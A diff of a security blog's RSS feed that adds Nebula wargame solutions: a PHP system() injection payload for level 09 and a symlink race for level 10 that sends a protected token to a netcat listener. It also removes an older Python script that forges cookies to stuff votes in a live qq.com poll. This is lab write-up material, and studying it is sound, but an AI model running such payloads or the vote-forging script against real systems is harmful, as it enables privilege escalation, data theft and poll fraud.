@@ -5,9 +5,73 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 23 May 2016 22:35:27 +0800</pubDate>
-    <lastBuildDate>Mon, 23 May 2016 22:35:27 +0800</lastBuildDate>
+    <pubDate>Wed, 25 May 2016 14:59:10 +0800</pubDate>
+    <lastBuildDate>Wed, 25 May 2016 14:59:10 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
+    
+      <item>
+        <title>rime五笔词库合并</title>
+        <description>&lt;h4 id=&quot;x01-step1on-kali-linux&quot;&gt;0x01 Step1:on kali linux&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/rime_dic_manager -l
+output:wubi86
+cd /root/桌面/
+/usr/bin/rime_dic_manager -e wubi86 kali.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x02-step2on-win7&quot;&gt;0x02 Step2:on win7&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd %appdata%\rime
+copy wubi86.userdb.kct \\kali\桌面\
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x03-step3on-kali-linux&quot;&gt;0x03 Step3:on kali linux&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /root/.config/fcitx/rime
+mv /root/.config/fcitx/rime/wubi86.userdb.kct wubi86.userdb.kct.bak
+cp /root/桌面/wubi86.userdb.kct .
+重新布置rime
+/usr/bin/rime_dic_manager -l
+cd /root/桌面
+/usr/bin/rime_dic_manager -e wubi86 win7.txt
+
+-------------------two ways since now---------------
+first:
+/usr/bin/rime_dic_manager -i wubi86 kali.txt
+重新布置rime
+
+second:
+vi -d kali.txt win7.txt
+vi kali.txt
+    G
+    o
+    esc
+    :r win7.txt
+    :x
+python 字典去重.py kali.txt         (output:outfile.txt)
+    this .py script:https://raw.githubusercontent.com/xinghuacai/password_tools/master/%E5%AD%97%E5%85%B8%E6%95%B4%E7%90%86%E5%8E%BB%E9%87%8D%E5%B7%A5%E5%85%B7/%E5%AD%97%E5%85%B8%E6%95%B4%E7%90%86%E5%8E%BB%E9%87%8D%E5%B7%A5%E5%85%B7.py
+
+/usr/bin/rime_dict_manager -r outfile.txt
+or
+/usr/bin/rime_dict_manager -i wubi86 outfile.txt
+
+重新布置rime
+---------------------end----------------------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+</description>
+        <pubDate>Tue, 24 May 2016 00:00:00 +0800</pubDate>
+        <link>/auxilary/2016/05/24/rime%E4%BA%94%E7%AC%94%E8%AF%8D%E5%BA%93%E5%90%88%E5%B9%B6/</link>
+        <guid isPermaLink="true">/auxilary/2016/05/24/rime%E4%BA%94%E7%AC%94%E8%AF%8D%E5%BA%93%E5%90%88%E5%B9%B6/</guid>
+        
+        <category>type</category>
+        
+        <category>rime</category>
+        
+        
+        <category>auxilary</category>
+        
+      </item>
     
       <item>
         <title>文件一键打包</title>
@@ -121,8 +185,12 @@ Binary compilation failures
 
 At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.
 
-official website:   https://exploit-exercises.com/nebula/  
-some witeup:    https://lightless.me/archives/Nebula-writeup.html
+official website:       https://exploit-exercises.com/nebula/  
+nebula.iso download:    http://pan.baidu.com/s/1dFdRIm9
+some witeup:    
+                        google--&amp;gt;cache:https://lightless.me/archives/Nebula-writeup.html
+                        or
+                        http://pan.baidu.com/s/1mhQgqCg
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -330,6 +398,57 @@ link knowledge:
     use hex dump view to find 7f==&amp;gt;. is backspace
     su - flag08
     pass:backd00Rmate
+    getflag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x09-level09&quot;&gt;0x09 level09&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    vi /tmp/level09.txt
+    ----content----
+    [email {${system($use_me)}}]
+    -----end-------
+    cd /home/flag09
+    ./flag09 /tmp/level09.txt getflag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x10-level10&quot;&gt;0x10 level10&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    vi /tmp/level10_1
+    ----conent------
+    #!/bin/sh
+    while true;
+    do
+        ln -sf /tmp/level10_2 /tmp/level10_3
+        ln -sf /home/flag10/token /tmp/level10_3
+    done
+    ----end---------
+    touch /tmp/level10_2
+    touch /tmp/level10_3
+    chmod +x /tmp/level10_1
+    vi /tmp/level10_11
+    ------content------
+    #!/bin/sh
+    while true;
+    do
+        /home/flag10/flag10 /tmp/level10_3 192.168.2.140
+    done
+    -----end-----------
+    chmod +x /tmp/level10_3
+    use another terminal:
+        nc -lv 18211
+    use another terminal:
+        ssh level10@192.168.2.140
+        pass:level10
+        /tmp/level10_1
+    use another terminal:
+        ssh level10@192.168.2.140
+        pass:level10
+        /tmp/level10_11
+    find the terminal with nc -lv 18211 received the content of token
+    su - flag10
+    pass:content of token
     getflag
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
@@ -2780,67 +2899,6 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
         
         
         <category>notes</category>
-        
-      </item>
-    
-      <item>
-        <title>Pyhton Cookie Post 刷票</title>
-        <description>&lt;p&gt;&lt;i class=&quot;fa fa-apple&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;
-记一次刷票代码&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib2&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;http://panshi.qq.com/v2/vote/10583890/submit&#39;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;c&quot;&gt;#cook=&#39;pgv_info=ssid=s&#39;+str(i+4607539873)+&#39;; pgv_pvi=&#39;+str(8520475648+i)+&#39;; pgv_pvid=&#39;+str(5279007010+i)+&#39;; sd_cookie_crttime=&#39;+str(1460508371298+i)+&#39;; sd_userid=&#39;+str(31421460508371298+i)+&#39;; touch =&#39;+j&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;cook&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;pgv_info=ssid=s&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;; pgv_pvi=&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;; pgv_pvid=&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;; sd_cookie_crttime=&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1460508371298&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;; sd_userid=&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31421460508371298&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;; touch =&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cook&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;Accept-Language&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;zh-cn&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;Accept-Encoding&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;gzip, deflate&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;Content-Type&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;application/x-www-form-urlencoded&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;Origin&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;http://hn.qq.com&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;Content-Length&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;163&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;Connection&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;close&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;User-Agent&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B436 MicroMessenger/6.3.&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39; NetType/WIFI Language/zh_CN&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;Referer&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;http://hn.qq.com/zt2016/terminal/cxcyds.htm?from=groupmessage&amp;amp;isappinstalled=0&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-	&lt;span class=&quot;c&quot;&gt;#data=&#39;&#39;&#39;answer=%7B%22639226%22%3A%7B%22selected%22%3A%5B1488426%5D%7D%7D&amp;amp;login=1&amp;amp;source=1&amp;amp;g_tk=2013&amp;amp;format=script&amp;amp;callback=parent.AppPlatform.Survey.Digg.ReceiveDiggResult&#39;&#39;&#39;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;answer&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&#39;&#39;{&quot;639226&quot;:{&quot;selected&quot;:[1488426]}}&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;login&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;source&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;g_tk&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;2013&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;format&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;script&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;s&quot;&gt;&#39;callback&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;parent.AppPlatform.Survey.Digg.ReceiveDiggResult&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-
-	&lt;span class=&quot;n&quot;&gt;opener&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;build_opener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;opener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addheaders&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;Cookie&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-	&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlencode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-	
-	&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Thu, 14 Apr 2016 00:00:00 +0800</pubDate>
-        <link>/python/2016/04/14/pyhton-cookie-post-%E5%88%B7%E7%A5%A8/</link>
-        <guid isPermaLink="true">/python/2016/04/14/pyhton-cookie-post-%E5%88%B7%E7%A5%A8/</guid>
-        
-        <category>http</category>
-        
-        <category>code</category>
-        
-        
-        <category>python</category>
         
       </item>
     
